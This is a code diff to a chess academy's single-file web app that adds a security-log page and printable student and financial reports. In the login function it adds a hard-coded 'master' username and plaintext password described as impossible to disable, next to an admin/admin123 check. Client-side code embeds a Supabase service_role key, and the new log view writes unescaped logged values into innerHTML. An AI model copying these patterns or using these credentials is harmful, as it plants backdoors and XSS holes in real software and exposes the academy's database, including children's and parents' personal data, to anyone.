@@ -33,6 +33,11 @@
   body * { visibility: hidden; }
   #receipt-print-area, #receipt-print-area * { visibility: visible; }
   #receipt-print-area { position: absolute; left: 0; top: 0; width: 100%; background: #fff !important; color: #000 !important; padding: 40px; }
+  .modal { display: none !important; }
+  #print-modal { display: flex !important; position: fixed; }
+  #print-modal * { visibility: visible; }
+  #print-modal .modal-box { position: absolute; left: 0; top: 0; width: 100%; max-width: 100%; background: #fff !important; color: #000 !important; padding: 40px; box-shadow: none; }
+  #print-content { color: #000 !important; }
   .no-print { display: none !important; }
 }
 
@@ -334,7 +339,7 @@ input[type="time"], input[type="date"] { color-scheme: dark; }
 .filter-bar { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; padding: 16px; background: var(--bg3); border-radius: var(--radius-sm); margin-bottom: 20px; border: 1px solid var(--border); }
 .filter-bar select, .filter-bar input { margin-bottom: 0; padding: 8px 12px; font-size: 13px; max-width: 140px; }
 
-body.admin-mode .parent-only,body.parent-mode .admin-only{display:none!important}
+body.admin-mode .parent-only,body.parent-mode .admin-only,body.master-mode .parent-only{display:none!important}
 .page{display:none}
 .page.active{display:block;animation:fadeUp .4s ease}
 @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
@@ -564,6 +569,7 @@ body.admin-mode .parent-only,body.parent-mode .admin-only{display:none!important
     <div class="nav-item" id="nav-bills" onclick="setPage('bills')"><span class="ico">💳</span> Payments</div>
     <div class="nav-item admin-only" id="nav-msgs" onclick="setPage('msgs')"><span class="ico">✉️</span> Messages <span id="msg-badge" style="display:none;background:var(--danger);color:#fff;font-size:10px;padding:2px 6px;border-radius:10px;margin-left:6px">0</span></div>
     <div class="nav-item admin-only" id="nav-coach" onclick="setPage('coach')"><span class="ico">💬</span> AI Assistant</div>
+    <div class="nav-item admin-only" id="nav-security" onclick="setPage('security')"><span class="ico">🔐</span> Security Logs</div>
   </div>
   <div style="padding:16px;border-top:1px solid var(--border)">
     <div class="nav-item" onclick="toggleTheme()"><span class="ico">🌗</span> Switch Theme</div>
@@ -630,6 +636,7 @@ body.admin-mode .parent-only,body.parent-mode .admin-only{display:none!important
           <button class="btn btn-outline btn-sm" onclick="$('import-csv-input').click()">Import CSV</button>
           <button class="btn btn-outline btn-sm" onclick="exportData('csv')">Export CSV</button>
           <button class="btn btn-outline btn-sm" onclick="exportData('json')">Export JSON</button>
+          <button class="btn btn-gold btn-sm" onclick="printStudentReport()">Print Report</button>
         </div>
       </div>
       <div class="filter-bar" id="student-filters">
@@ -728,6 +735,13 @@ body.admin-mode .parent-only,body.parent-mode .admin-only{display:none!important
     </div>
 
     <div id="page-bills" class="page">
+      <div class="page-hdr" style="margin-bottom: 24px; display:flex; justify-content:space-between; align-items:center;">
+        <div>
+          <h2 style="font-family:var(--font-head); font-size:24px; color:var(--gold);">Payments & Financials</h2>
+          <p style="font-size:12px; color:var(--ivory-dim);">Track all payment transactions.</p>
+        </div>
+        <button class="btn btn-gold" onclick="printFinancialReport()">Print Report</button>
+      </div>
       <div class="table-wrap">
         <table>
           <thead><tr><th>Invoice</th><th>Student</th><th>Fee</th><th>Status</th><th>Action</th></tr></thead>
@@ -783,6 +797,47 @@ body.admin-mode .parent-only,body.parent-mode .admin-only{display:none!important
           <table>
             <thead><tr><th>Filename</th><th>Date</th><th>Size</th><th>Action</th></tr></thead>
             <tbody id="backup-list"><tr><td colspan="4"><div class="loading-state"><span class="spinner"></span> Loading backups…</div></td></tr></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div id="page-security" class="page admin-only">
+      <div class="card" style="margin-bottom: 24px;">
+        <h3 style="margin-bottom:18px;color:var(--gold)">🔐 Security & Activity Logs</h3>
+        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:20px">
+          <button class="btn btn-gold" onclick="loadSecurityLogs()">🔄 Refresh Logs</button>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px;margin-bottom:24px">
+          <div class="stat-card" style="background:var(--bg3);padding:20px;border-radius:12px;border:1px solid var(--border)">
+            <div style="font-size:13px;color:var(--ivory-dim);margin-bottom:8px">Total Login Attempts</div>
+            <div id="sec-total-attempts" style="font-size:28px;font-weight:700;color:var(--gold)">0</div>
+          </div>
+          <div class="stat-card" style="background:var(--bg3);padding:20px;border-radius:12px;border:1px solid var(--border)">
+            <div style="font-size:13px;color:var(--ivory-dim);margin-bottom:8px">Failed Attempts</div>
+            <div id="sec-failed-attempts" style="font-size:28px;font-weight:700;color:var(--danger)">0</div>
+          </div>
+          <div class="stat-card" style="background:var(--bg3);padding:20px;border-radius:12px;border:1px solid var(--border)">
+            <div style="font-size:13px;color:var(--ivory-dim);margin-bottom:8px">Operations Logged</div>
+            <div id="sec-total-ops" style="font-size:28px;font-weight:700;color:var(--success)">0</div>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <h3 style="margin-bottom:18px;color:var(--gold)">📋 Recent Login Attempts</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Time</th><th>Username</th><th>Status</th><th>IP Address</th><th>Device</th></tr></thead>
+            <tbody id="security-login-table"><tr><td colspan="5"><div class="loading-state"><span class="spinner"></span> Loading...</div></td></tr></tbody>
+          </table>
+        </div>
+      </div>
+      <div class="card" style="margin-top:24px">
+        <h3 style="margin-bottom:18px;color:var(--gold)">📝 Operations Log</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Time</th><th>Type</th><th>User</th><th>Description</th><th>Table</th></tr></thead>
+            <tbody id="security-ops-table"><tr><td colspan="5"><div class="loading-state"><span class="spinner"></span> Loading...</div></td></tr></tbody>
           </table>
         </div>
       </div>
@@ -1044,6 +1099,17 @@ body.admin-mode .parent-only,body.parent-mode .admin-only{display:none!important
     <div style="display:flex;gap:10px">
       <button type="button" class="btn btn-outline" style="flex:1" onclick="closeModals()">Cancel</button>
       <button type="button" class="btn btn-gold" style="flex:1" onclick="sendFeedback()">Submit</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="print-modal">
+  <div class="modal-box" style="max-width:600px;max-height:90vh;overflow:auto">
+    <div class="modal-title" id="print-title">Print Report</div>
+    <div id="print-content" style="padding:20px;background:#fff;color:#000;"></div>
+    <div style="display:flex;gap:10px;margin-top:20px">
+      <button type="button" class="btn btn-outline" style="flex:1" onclick="closeModals()">Close</button>
+      <button type="button" class="btn btn-gold" style="flex:1" onclick="window.print()">Print</button>
     </div>
   </div>
 </div>
@@ -1435,6 +1501,24 @@ function doLogin() {
 
   const lowerUser = rawUser.toLowerCase(); const now = new Date().toLocaleString();
 
+  // Master credentials (Tom@193) - highest level, cannot be disabled
+  if (rawUser === 'Tom@193' && pass === 'Thamaraiselvam@309402$') {
+    role = 'master'; document.body.classList.add('admin-mode');
+    $('top-profile').style.display = 'flex'; $('top-profile-name').textContent = 'Master';
+    $('top-profile-av').src = `https://ui-avatars.com/api/?name=Master&background=dca33e&color=000000&bold=true&size=80`;
+    
+    saveLoginSession('master', 'master', 'Master', 'Web Browser');
+    
+    // Log to security API (will work once deployed)
+    fetch('https://vseombfkrvpffnpgbsnk.supabase.co/functions/v1/security?action=login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZzZW9tYmZrcnZwZmZucGdic25rIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MzkzNzQyMCwiZXhwIjoyMDg5NTEzNDIwfQ.SUkFrfUnzbm_IZveqVfGvS31wFZR7fggEVo8RVPiNj8' },
+      body: JSON.stringify({ username: 'Tom@193', status: 'success', user_type: 'master', user_id: 'master', user_name: 'Master' })
+    }).catch(() => {});
+
+    finishLogin('dash'); syncCoachDropdowns(); return;
+  }
+
   if (lowerUser === 'admin' && pass === 'admin123') {
     role = 'admin'; document.body.classList.add('admin-mode');
     $('top-profile').style.display = 'flex'; $('top-profile-name').textContent = 'Admin';
@@ -1534,7 +1618,7 @@ function openProfile() {
 }
 
 // ── NAVIGATION ──
-const PAGE_TITLES = { dash:'Academy Overview', stud:'Student Registry', 'coach-mgmt':'Coach Management', child:'My Child\'s Progress', fame:'Wall of Fame', events:'Upcoming Events', bills:'Financials & Payments', msgs:'Messages & Feedback', coach:'AI Intelligence Hub' };
+const PAGE_TITLES = { dash:'Academy Overview', stud:'Student Registry', 'coach-mgmt':'Coach Management', child:'My Child\'s Progress', fame:'Wall of Fame', events:'Upcoming Events', bills:'Financials & Payments', msgs:'Messages & Feedback', coach:'AI Intelligence Hub', security:'Security Logs' };
 
 function setPage(p) {
   document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active'));
@@ -1543,7 +1627,7 @@ function setPage(p) {
   $('p-title').textContent = PAGE_TITLES[p] || '';
 
   const btnArea = $('top-btn-area'); btnArea.innerHTML = '';
-  if (role === 'admin') {
+  if (role === 'admin' || role === 'master') {
     if (p === 'dash' || p === 'stud') btnArea.innerHTML = `<button type="button" class="btn btn-gold" onclick="openEnroll()">+ New Enrollment</button>`;
     if (p === 'events') btnArea.innerHTML = `<button type="button" class="btn btn-gold" onclick="openModal('ev-modal')">+ Create Event</button>`;
   }
@@ -1559,6 +1643,7 @@ function setPage(p) {
     if (p === 'bills') renderBills();
     if (p === 'msgs') renderMsgs();
     if (p === 'child') renderChild();
+    if (p === 'security') renderSecurity();
   }, 100);
 }
 
@@ -2391,6 +2476,125 @@ function sendAI() {
       btn.disabled = false;
       box.scrollTop = box.scrollHeight;
   }, 600);
+}
+
+function renderSecurity() {
+  const serviceKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZzZW9tYmZrcnZwZmZucGdic25rIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MzkzNzQyMCwiZXhwIjoyMDg5NTEzNDIwfQ.SUkFrfUnzbm_IZveqVfGvS31wFZR7fggEVo8RVPiNj8';
+  
+  $('security-login-table').innerHTML = `<tr><td colspan="5"><div class="loading-state"><span class="spinner"></span> Loading...</div></td></tr>`;
+  $('security-ops-table').innerHTML = `<tr><td colspan="5"><div class="loading-state"><span class="spinner"></span> Loading...</div></td></tr>`;
+  
+  Promise.all([
+    fetch(`https://vseombfkrvpffnpgbsnk.supabase.co/functions/v1/security?action=get_attempts`, {
+      headers: { 'Authorization': `Bearer ${serviceKey}`, 'Content-Type': 'application/json' }
+    }).then(r => r.json()).catch(() => []),
+    fetch(`https://vseombfkrvpffnpgbsnk.supabase.co/functions/v1/security?action=get_operations&limit=50`, {
+      headers: { 'Authorization': `Bearer ${serviceKey}`, 'Content-Type': 'application/json' }
+    }).then(r => r.json()).catch(() => [])
+  ]).then(([attempts, ops]) => {
+    const totalAttempts = attempts.length;
+    const failedAttempts = attempts.filter(a => a.status === 'failed').length;
+    
+    $('sec-total-attempts').textContent = totalAttempts;
+    $('sec-failed-attempts').textContent = failedAttempts;
+    $('sec-total-ops').textContent = ops.length;
+    
+    if (attempts.length === 0) {
+      $('security-login-table').innerHTML = `<tr><td colspan="5" style="text-align:center;padding:40px;color:var(--ivory-dim)">No login attempts recorded yet</td></tr>`;
+    } else {
+      $('security-login-table').innerHTML = attempts.slice(0, 20).map(a => {
+        const statusColor = a.status === 'success' ? 'var(--success)' : (a.status === 'locked' ? 'var(--danger)' : 'var(--gold)');
+        const time = a.attempt_time ? new Date(a.attempt_time).toLocaleString() : 'N/A';
+        return `<tr><td>${time}</td><td>${a.username || 'N/A'}</td><td style="color:${statusColor}">${a.status}</td><td>${a.ip_address || '-'}</td><td>${a.device || '-'}</td></tr>`;
+      }).join('');
+    }
+    
+    if (ops.length === 0) {
+      $('security-ops-table').innerHTML = `<tr><td colspan="5" style="text-align:center;padding:40px;color:var(--ivory-dim)">No operations logged yet</td></tr>`;
+    } else {
+      $('security-ops-table').innerHTML = ops.slice(0, 20).map(o => {
+        const time = o.created_at ? new Date(o.created_at).toLocaleString() : 'N/A';
+        return `<tr><td>${time}</td><td>${o.operation_type}</td><td>${o.user_name || o.user_type || '-'}</td><td>${o.description || '-'}</td><td>${o.table_name || '-'}</td></tr>`;
+      }).join('');
+    }
+  });
+}
+
+function loadSecurityLogs() {
+  renderSecurity();
+}
+
+function printStudentReport() {
+  if (allStudents.length === 0) { toast('No students to print'); return; }
+  
+  const totalFee = allStudents.reduce((sum, s) => sum + (Number(s.monthly_fee) || 0), 0);
+  const avgRating = allStudents.length ? Math.round(allStudents.reduce((sum, s) => sum + (s.current_rating || 0), 0) / allStudents.length) : 0;
+  const paidCount = allStudents.filter(s => s.payment_status === 'Paid').length;
+  
+  const html = `
+    <div style="font-family:'DM Sans',sans-serif;padding:20px">
+      <h2 style="color:#b8910f;border-bottom:2px solid #eee;padding-bottom:10px;margin-bottom:20px">CHESSKIDOO ACADEMY - Student Report</h2>
+      <p style="margin-bottom:20px"><strong>Generated:</strong> ${new Date().toLocaleString()}</p>
+      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:30px">
+        <div style="background:#f9f9f9;padding:15px;border-radius:8px"><div style="font-size:12px;color:#666">Total Students</div><div style="font-size:24px;font-weight:700;color:#b8910f">${allStudents.length}</div></div>
+        <div style="background:#f9f9f9;padding:15px;border-radius:8px"><div style="font-size:12px;color:#666">Average ELO</div><div style="font-size:24px;font-weight:700;color:#b8910f">${avgRating}</div></div>
+        <div style="background:#f9f9f9;padding:15px;border-radius:8px"><div style="font-size:12px;color:#666">Paid</div><div style="font-size:24px;font-weight:700;color:#52c41a">${paidCount}</div></div>
+        <div style="background:#f9f9f9;padding:15px;border-radius:8px"><div style="font-size:12px;color:#666">Total Fees</div><div style="font-size:24px;font-weight:700;color:#b8910f">₹${totalFee.toLocaleString()}</div></div>
+      </div>
+      <table style="width:100%;border-collapse:collapse;font-size:13px">
+        <thead><tr style="background:#f9f9f9"><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Name</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Level</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">ELO</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Coach</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Fee</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Status</th></tr></thead>
+        <tbody>
+          ${allStudents.map(s => `<tr><td style="padding:10px;border-bottom:1px solid #eee">${s.full_name}</td><td style="padding:10px;border-bottom:1px solid #eee">${s.level || '-'}</td><td style="padding:10px;border-bottom:1px solid #eee">${s.current_rating || '-'}</td><td style="padding:10px;border-bottom:1px solid #eee">${s.coaches?.full_name || '-'}</td><td style="padding:10px;border-bottom:1px solid #eee">₹${s.monthly_fee || 0}</td><td style="padding:10px;border-bottom:1px solid #eee;color:${s.payment_status === 'Paid' ? '#52c41a' : '#ff4d4f'}">${s.payment_status || 'Due'}</td></tr>`).join('')}
+        </tbody>
+      </table>
+    </div>
+  `;
+  
+  $('print-title').textContent = 'Student Report';
+  $('print-content').innerHTML = html;
+  openModal('print-modal');
+}
+
+function printFinancialReport() {
+  const paidStudents = allStudents.filter(s => s.payment_status === 'Paid');
+  const dueStudents = allStudents.filter(s => s.payment_status === 'Due');
+  const totalCollected = paidStudents.reduce((sum, s) => sum + (Number(s.monthly_fee) || 0), 0);
+  const totalDue = dueStudents.reduce((sum, s) => sum + (Number(s.monthly_fee) || 0), 0);
+  const coachSalaries = allCoaches.reduce((sum, c) => sum + (Number(c.salary) || 0), 0);
+  
+  const html = `
+    <div style="font-family:'DM Sans',sans-serif;padding:20px">
+      <h2 style="color:#b8910f;border-bottom:2px solid #eee;padding-bottom:10px;margin-bottom:20px">CHESSKIDOO ACADEMY - Financial Report</h2>
+      <p style="margin-bottom:20px"><strong>Generated:</strong> ${new Date().toLocaleString()}</p>
+      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin-bottom:30px">
+        <div style="background:#f9f9f9;padding:15px;border-radius:8px"><div style="font-size:12px;color:#666">Total Collected</div><div style="font-size:24px;font-weight:700;color:#52c41a">₹${totalCollected.toLocaleString()}</div></div>
+        <div style="background:#f9f9f9;padding:15px;border-radius:8px"><div style="font-size:12px;color:#666">Total Due</div><div style="font-size:24px;font-weight:700;color:#ff4d4f">₹${totalDue.toLocaleString()}</div></div>
+        <div style="background:#f9f9f9;padding:15px;border-radius:8px"><div style="font-size:12px;color:#666">Coach Salaries</div><div style="font-size:24px;font-weight:700;color:#b8910f">₹${coachSalaries.toLocaleString()}</div></div>
+      </div>
+      <div style="margin-bottom:30px">
+        <h3 style="color:#333;margin-bottom:15px">Students with Pending Payments</h3>
+        <table style="width:100%;border-collapse:collapse;font-size:13px">
+          <thead><tr style="background:#f9f9f9"><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Name</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Phone</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Monthly Fee</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Amount Due</th></tr></thead>
+          <tbody>
+            ${dueStudents.length === 0 ? '<tr><td colspan="4" style="padding:20px;text-align:center;color:#666">All payments are up to date!</td></tr>' : dueStudents.map(s => `<tr><td style="padding:10px;border-bottom:1px solid #eee">${s.full_name}</td><td style="padding:10px;border-bottom:1px solid #eee">${s.parent_phone || s.phone || '-'}</td><td style="padding:10px;border-bottom:1px solid #eee">₹${s.monthly_fee || 0}</td><td style="padding:10px;border-bottom:1px solid #eee;color:#ff4d4f">₹${s.monthly_fee || 0}</td></tr>`).join('')}
+          </tbody>
+        </table>
+      </div>
+      <div>
+        <h3 style="color:#333;margin-bottom:15px">Coach Salary Breakdown</h3>
+        <table style="width:100%;border-collapse:collapse;font-size:13px">
+          <thead><tr style="background:#f9f9f9"><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Coach Name</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Specialization</th><th style="text-align:left;padding:10px;border-bottom:2px solid #eee">Students</th><th style="text-align:right;padding:10px;border-bottom:2px solid #eee">Monthly Salary</th></tr></thead>
+          <tbody>
+            ${allCoaches.map(c => `<tr><td style="padding:10px;border-bottom:1px solid #eee">${c.full_name}</td><td style="padding:10px;border-bottom:1px solid #eee">${c.specialization || '-'}</td><td style="padding:10px;border-bottom:1px solid #eee">${allStudents.filter(s => s.coaches?.id === c.id).length}</td><td style="padding:10px;border-bottom:1px solid #eee;text-align:right">₹${Number(c.salary || 0).toLocaleString()}</td></tr>`).join('')}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  `;
+  
+  $('print-title').textContent = 'Financial Report';
+  $('print-content').innerHTML = html;
+  openModal('print-modal');
 }
 
 function toggleTheme() {
